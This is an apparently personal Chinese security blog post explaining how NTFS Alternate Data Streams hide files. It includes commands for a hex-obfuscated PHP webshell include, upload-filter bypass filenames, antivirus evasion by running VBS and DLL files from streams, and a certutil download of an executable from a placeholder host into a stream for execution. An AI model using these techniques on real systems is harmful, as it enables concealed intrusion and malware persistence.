<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ADS数据流实现隐藏文件 | ALe's Blog</title><meta name="author" content="ALe"><meta name="copyright" content="ALe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情 在NTFS分区创建ADS数据流文件有两种形式：  一是指定宿主文件； 二是创建单独的ADS文件。  创建的指令有两个：echo 和 type">
<meta property="og:type" content="article">
<meta property="og:title" content="ADS数据流实现隐藏文件">
<meta property="og:url" content="https://ale1293528.github.io/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/index.html">
<meta property="og:site_name" content="ALe&#39;s Blog">
<meta property="og:description" content="ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情 在NTFS分区创建ADS数据流文件有两种形式：  一是指定宿主文件； 二是创建单独的ADS文件。  创建的指令有两个：echo 和 type">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ale1293528.github.io/img/anon.jpg">
<meta property="article:published_time" content="2025-07-23T17:42:20.000Z">
<meta property="article:modified_time" content="2025-07-23T19:20:06.072Z">
<meta property="article:author" content="ALe">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ale1293528.github.io/img/anon.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ADS数据流实现隐藏文件",
  "url": "https://ale1293528.github.io/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/",
  "image": "https://ale1293528.github.io/img/anon.jpg",
  "datePublished": "2025-07-23T17:42:20.000Z",
  "dateModified": "2025-07-23T19:20:06.072Z",
  "author": [
    {
      "@type": "Person",
      "name": "ALe",
      "url": "https://ale1293528.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ale1293528.github.io/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ADS数据流实现隐藏文件',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/anon.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ALe's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">ADS数据流实现隐藏文件</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ADS数据流实现隐藏文件</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-07-23T17:42:20.000Z" title="Created 2025-07-24 01:42:20">2025-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-23T19:20:06.072Z" title="Updated 2025-07-24 03:20:06">2025-07-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>ADS：Alternate DataStreams，全称 NTFS 交换数据流，是 NTFS 磁盘格式的一个特性，在 NTFS 文件系统下，每个文件都可以存在多个数据流。简单来说，就是其他文件可以寄宿在某个文件身上。利用 ADS 数据流可以做很多有趣的事情</p>
<p>在NTFS分区创建ADS数据流文件有两种形式：</p>
<ul>
<li>一是指定宿主文件；</li>
<li>二是创建单独的ADS文件。</li>
</ul>
<p>创建的指令有两个：echo 和 type</p>
<ul>
<li>echo 用于常规字符</li>
<li>type 用于将文件附加到某个文件</li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="1-使用宿主文件"><a href="#1-使用宿主文件" class="headerlink" title="1. 使用宿主文件"></a>1. 使用宿主文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo test &gt; 1.txt:flag.txt</span><br></pre></td></tr></table></figure>
<p>正常用 dir 是无法查看到的，可以使用 dir &#x2F;r</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 46BD-3363</span><br><span class="line"></span><br><span class="line"> C:\test 的目录</span><br><span class="line"></span><br><span class="line">2025/07/22  03:53    &lt;DIR&gt;          .</span><br><span class="line">2025/07/22  03:53    &lt;DIR&gt;          ..</span><br><span class="line">2025/07/22  03:53                 0 1.txt</span><br><span class="line">               1 个文件              0 字节</span><br><span class="line">               2 个目录 45,771,202,560 可用字节</span><br><span class="line"></span><br><span class="line">C:\test&gt;dir /r</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 46BD-3363</span><br><span class="line"></span><br><span class="line"> C:\test 的目录</span><br><span class="line"></span><br><span class="line">2025/07/22  03:53    &lt;DIR&gt;          .</span><br><span class="line">2025/07/22  03:53    &lt;DIR&gt;          ..</span><br><span class="line">2025/07/22  03:53                 0 1.txt</span><br><span class="line">                                  9 1.txt:flag.txt:$DATA</span><br><span class="line">               1 个文件              0 字节</span><br><span class="line">               2 个目录 45,771,161,600 可用字节</span><br></pre></td></tr></table></figure>
<p>文件内容可以使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad 1.txt:flag.txt</span><br></pre></td></tr></table></figure>
<p>此类文件可以通过直接删除宿主文件清除。</p>
<h3 id="2-单独的-ADS-数据流文件"><a href="#2-单独的-ADS-数据流文件" class="headerlink" title="2. 单独的 ADS 数据流文件"></a>2. 单独的 ADS 数据流文件</h3><p>这类可以通过以下命令来创建：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hide &gt; :mo.txt</span><br></pre></td></tr></table></figure>
<p>创建后该目录内是没有文件的，并且用当前目录下的命令行也无法查看，因为它是依赖于文件夹的ADS数据流文件</p>
<p>因此需要退到上一级目录去查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ../</span><br><span class="line">notepad test</span><br></pre></td></tr></table></figure>

<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>由于 Windows 系统对 ADS 文件都没有执行权限，因此隐藏此类 webshell 需要用到文件包含来配合</p>
<p>首先创建一个被包含文件：index.php:mo.txt</p>
<p>在里面藏一个 phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php phpinfo();?^&gt; &gt; index.php:mo.txt</span><br></pre></td></tr></table></figure>

<p>为了避免被查，给文件名进行 hex 编码，最后创建一个实现文件包含功能的 include.php </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;696E6465782E7068&quot;.&quot;703A6D6F2E747874&quot;;</span><br><span class="line">$b=&quot;a&quot;;</span><br><span class="line">include(PACK(&#x27;H*&#x27;,$$b))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>当然这里也可以借助此数据流实现 Bypass 上传黑名单限制</p>
<p>当我们上传数据流文件时，形如 test.php::$DATA 、test.php:a.txt 这样的后缀， windows 系统就会需要创建一个对应的宿主文件 test.php ，同时假设我们需要上传的文件内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>根据上传文件名不同，会产生不同效果</p>
<p><code>test.php:a.jpg</code></p>
<p>效果：生成 test.php，文件内容为空</p>
<p><code>test.php::$DATA</code></p>
<p>效果：生成 test.php, 文件内容为 <code>&lt;?php phpinfo();?&gt;</code></p>
<p><code>test.php::$INDEX_ALLOCATION</code></p>
<p>效果：生成 test.php 文件夹</p>
<p><code>test.php::$DATA\0.jpg</code></p>
<p>效果：生成 0.jpg，文件内容为 <code>&lt;?php phpinfo();?&gt;</code></p>
<p>上传文件名为 Test.php::$INDEX_ALLOCATION 时会生成对应的文件夹，那么以理论上来说是可以用于突破 UDF 提权时无法创建文件夹的问题，但是我测试的时候并不可以，不知道是为什么，严重怀疑被参考文献骗了┭┮﹏┭┮</p>
<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><p>windows的数据流文件都被禁止了执行权限，因此可以使用 wscript 来运行 vbs，在C盘的根目录使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type 1.vbs &gt; :2.vbs</span><br></pre></td></tr></table></figure>
<p>可以创建 C 盘存在的数据流文件 c::2.vbs，没有工具是无法清除的，而且也可以绕过部分安全厂商的查杀</p>
<p>这个 vbs 文件也是可以运行的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscript c::2.vbs</span><br></pre></td></tr></table></figure>
<p>dll 文件同理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type test.dll &gt; 1.txt:ms</span><br><span class="line">regsvr32 1.txt:ms</span><br></pre></td></tr></table></figure>

<p>清除方式：用winhex或者删除宿主文件或者借助相关工具如 IceSword 也可进行删除。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="通过文件上传执行"><a href="#通过文件上传执行" class="headerlink" title="通过文件上传执行"></a>通过文件上传执行</h3><p>在 C:\WINDOWS\debug\WIA 的目录下（这个目录常被用于 Dropper（下发payload）或免杀执行）</p>
<p>上传文件到 ADS 数据流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload /tmp/beacon.exe \\.\c:\WINDOWS\debug\WIA\test:aa.exe</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wmic process call create \\.\c:\WINDOWS\debug\WIA\test:aa.exe</span><br><span class="line"></span><br><span class="line">$execute -cH -f &quot;\\\\.\\c:\\WINDOWS\\debug\\WIA\\test:aa.exe&quot; (也可以使用msf来执行)</span><br></pre></td></tr></table></figure>

<h3 id="通过文件下载执行"><a href="#通过文件下载执行" class="headerlink" title="通过文件下载执行"></a>通过文件下载执行</h3><p>利用 certutil 从 HTTP 下载一个文件并直接写入目标 ADS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$certutil -urlcache -split -f http://url/test.exe \\.\c:\WINDOWS\debug\WIA\test:aa.exe</span><br></pre></td></tr></table></figure>

<p>删除certutil缓存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$certutil.exe -urlcache -split -f http://url/test.exe delete</span><br></pre></td></tr></table></figure>

<h3 id="进一步隐藏"><a href="#进一步隐藏" class="headerlink" title="进一步隐藏"></a>进一步隐藏</h3><p>如果想要 dir&#x2F;s 里看不到 ADS，可以使用特殊的文件名称：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\\.\C:\test\COM1</span><br><span class="line">\\.\C:\test\COM2</span><br><span class="line">\\.\C:\test\COM3-8</span><br><span class="line">\\.\C:\test\COM9</span><br><span class="line">\\.\C:\test\nul</span><br></pre></td></tr></table></figure>

<p>并且这些文件是不可以直接在UI界面删除的，要删除的话使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\.\C:\test\nul</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io">ALe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ale1293528.github.io/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/">https://ale1293528.github.io/2025/07/24/ADS%E6%95%B0%E6%8D%AE%E6%B5%81%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="post-share"><div class="social-share" data-image="/img/anon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/27/%E5%AE%9E%E4%B9%A0%E9%9A%8F%E6%83%B3/" title="实习随想"><img class="cover" src="/img/mygo4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">实习随想</div></div><div class="info-2"><div class="info-item-1">为期一个多月的实习也是终于要结束了，暑假的一半时间就这么用在了当牛马的日子了，结束之前还是先复盘一下总结一下收获吧 首先也是感谢导师给我这么一个机会把我内推进来，本来这个假期是想去护网的，可惜没有去成，不过也是因祸得福有了这么一个实习的机会，虽说圈到的钱是天差地别，但是也没办法 实习的地方在上海的360安全云（其实是外包），也是第一次来到大城市打拼，也遇到了很多麻烦，但是最终也是想办法解决了 首先就是工作的内容，虽然来之前我就有了心理预期，又是外包又是实习生，双重 buff 的加持下肯定是没有机会去触碰到核心业务的，但是没想到工作内容这么牛马┭┮﹏┭┮ 工作的内容，说的高大上一点就是为客户提供云上的安全即服务，说的通俗一点就是和蓝初监测组一样，每天就是看看告警然后上报，最多再有个输出报告（ai输出），而且推推上也接入了ai辅助判断告警，可以说是需要点脑子，但是不多。 但是这段实习总的来说收获还是有的，首先就是更深层次理解了态感的工作原理和部署原理，也了解到了360态感一体机和推推云服务的工作原理（过一两个月可能就忘光了），还有就是了解到了乙方厂商的安全服务的架构和基础建设。还有就...</div></div></div></a><a class="pagination-related" href="/2025/07/21/python%E5%86%85%E5%AD%98%E9%A9%AC/" title="python 内存马"><img class="cover" src="/img/mygo2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">python 内存马</div></div><div class="info-2"><div class="info-item-1">之前一直想学内存马，但是碍于对 java 的了解近乎为0，对jndi的了解也是只停留在会背面经的层面，所以一直没有去学，直到后来翻一些文章发现 python 也可以利用 SSTI 进行内存马注入，于是迅速开整 Flask常见的 Python Web 框架如 Django 和 Flask 都有可能存在 SSTI（Server-Side Template Injection，服务端模板注入）漏洞 在 Flask 中，使用 render_template_string() 渲染模板时，若将用户输入直接传入而未做过滤处理，就可能导致 SSTI 漏洞。攻击者可通过该漏洞注入恶意模板代码，从而实现 代码执行，甚至进一步植入 内存马 内存马注入原理（Flask 路由机制）Flask 常规注册路由的方式是通过装饰器 @app.route()，但底层实际是调用了： 1self.add_url_rule(rule, endpoint=None, view_func=None)  各参数说明如下：  rule：URL 路径（必须以 / 开头），与 @app.route() 中的路径一致 endpoin...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/05/2021%20OWASP%20TOP%2010/" title="2021 OWASP TOP 10"><img class="cover" src="/img/anon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-05</div><div class="info-item-2">2021 OWASP TOP 10</div></div><div class="info-2"><div class="info-item-1">近些年漏洞的威胁分类也发生了很大变化，王道SQL注入也慢慢淡出历史的舞台，最新OWASP Top Ten | OWASP Foundation版，分类和排名都变化了很多  [TOP1]失效的访问控制访问控制失效指的是：系统没有正确限制用户访问资源或功能，导致用户可以访问本不该访问的内容或操作 具体的例子：用户越权访问 用户 A 修改自己的资料：  1POST /api/user/update?id=1001   他把 ID 改成了管理员的 ID：  1POST /api/user/update?id=1   没有权限校验？那就直接修改管理员信息成功了  水平越权普通用户访问了其他用户的数据，比如： 1GET /api/orders/123456  → 返回了别人的订单信息（严重泄露） 垂直越权普通用户调用了管理员接口： 1POST /api/admin/delete_user?id=2  如果没检查角色权限，就能直接删号 前端控制误信前端隐藏了按钮，认为“用户就点不到”： 12&lt;!-- 管理员按钮 --&gt;&lt;button style=&quot;display: ...</div></div></div></a><a class="pagination-related" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改"><img class="cover" src="/img/qingniao2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-30</div><div class="info-item-2">BehinderV4魔改</div></div><div class="info-2"><div class="info-item-1">“冰蝎”(Behinder)是一个动态二进制加密网站管理客户端，相比较于传统的老牌工具“菜刀”而言，对webshell的流量进行了相应的加密。”冰蝎”客户端基于JAVA，所以可以跨平台使用，随着版本的升级，兼容性也随之提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大，是现如今必不可少的渗透测试工具之一 如今借助大模型，ai 对流量中木马特征的监测已经越来越准确，可冰蝎早已不再更新，木马上传上去之间就落地成盒，所以我们要对冰蝎马在原本的基础上进行改造 冰蝎特征冰蝎有两个强特征，分别是  和数据包一大堆加密 如果这个数据包可以用冰蝎的传输协议解密，那就实锤为冰蝎马 除此之外还有数个弱特征例如 connection：keep-alive ，固定的 ua 头等 所以我们的魔改需要解决两个问题：  绕过识别（魔改打乱指纹信息） 绕过查杀（新增加密算法）  JAP 反编译打包构建https://www.decompiler.com/ 在这个网站在线反编译，然后下载下来（也可以用 jd-gui 工具反编译） 在 i...</div></div></div></a><a class="pagination-related" href="/2025/08/21/Python-Bottle-SSTI/" title="Python Bottle SSTI"><img class="cover" src="/img/anon2.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-21</div><div class="info-item-2">Python Bottle SSTI</div></div><div class="info-2"><div class="info-item-1">XYCTF 中碰到的 Bottle 框架，当时做题根本没想到通过审计框架代码找漏洞点，也是学到新东西了  Bottle 简介Bottle 是一个 Python 的轻量级 Web 框架，完全依赖标准库（除了 wsgi 的部分），体积非常小（一个 .py 文件就能运行），适合写小型 Web 应用、API 或原型系统。它的设计理念是 “单文件、零依赖”，所以部署非常方便。 主要特点   特点 说明    单文件 框架代码就是一个 bottle.py 文件，方便直接打包或拷贝   零依赖 除了 Python 标准库外不需要额外安装其它库   内置开发服务器 用 run() 就能启动 HTTP 服务   支持多模板引擎 默认内置 SimpleTemplate，也支持 Jinja2、Mako 等   路由简洁 使用装饰器 @route() 定义 URL 对应的处理函数   WSGI兼容 可以在任何 WSGI 服务器（如 gunicorn、uWSGI）上部署   内置常用工具 请求&#x2F;响应处理、静态文件服务、Cookie、表单解析等   基本结构示例1234567from bottle...</div></div></div></a><a class="pagination-related" href="/2026/01/12/RASP%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E7%BB%95%E8%BF%87/" title="RASP的基础和绕过"><img class="cover" src="/img/anon1.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-12</div><div class="info-item-2">RASP的基础和绕过</div></div><div class="info-2"><div class="info-item-1">什么是 RASPRASP，全称为 Runtime application self-protection，将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预 在攻防中，大部分都是基于流量规则的 waf 和态感，waf 误报率高，也容易被绕过，而且需要人工干预，而RASP技术防御是根据请求上下文进行拦截的，和 WAF 对比非常明显，我们用一个 sql 的攻击来举例 攻击者对http://xxx.com/index.do?id=1进行测试，一般情况会通过一些 sql 语句的拼接来验证是否有注入，这时会对 url 进行大量发包，如下： http://xxx.com/index.do?id=1' and 1&#x3D;2– 但是由于程序内部的过滤，实际执行的 sql 语句可能是这样： select id,name,age from home where id&#x3D;’1 &#39; and 1&#x3D;2–’ 对于 WAF 来说，只要你的流量包命中 ...</div></div></div></a><a class="pagination-related" href="/2025/08/23/SQL%20to%20RCE/" title="SQL to RCE"><img class="cover" src="/img/anon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-23</div><div class="info-item-2">SQL to RCE</div></div><div class="info-2"><div class="info-item-1"> 有一些陈旧、庞大的系统中，因为一些复杂的原因，往往仍在使用 sa 账户登入 SQL Server，而在有如此高权限的资料库账户权限下，我们可以轻易利用 xp_cmdshell 来执行系统指令，但是这是几乎不可能的，我们取得的数据库账户必然是低权限，但因为发现的 SQL 注入是堆叠注入，我们仍然可以对表进行 CRUD，运气好可以控制一些网站设定变数的话，甚至可以直接 RCE  就比如我们可以发现某些特殊的数据库： 123456Database: ASPState[2 tables]+---------------------------------------+| dbo.ASPStateTempApplications          || dbo.ASPStateTempSessions              |+---------------------------------------+  这个数据库的存在用途是用来保存 ASP.NET 网站应用程式的 session。  在 